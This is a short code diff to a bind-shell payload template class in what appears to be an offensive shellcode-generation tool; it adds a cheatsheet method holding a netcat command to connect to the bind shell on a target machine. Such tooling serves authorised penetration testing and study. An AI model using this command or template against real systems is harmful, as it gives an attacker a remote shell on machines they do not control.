@@ -88,3 +88,8 @@ class BindShellTemplate(PayloadTemplate):
             f"    call dword ptr {cpa}",
             "",
         ])
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
+        ]
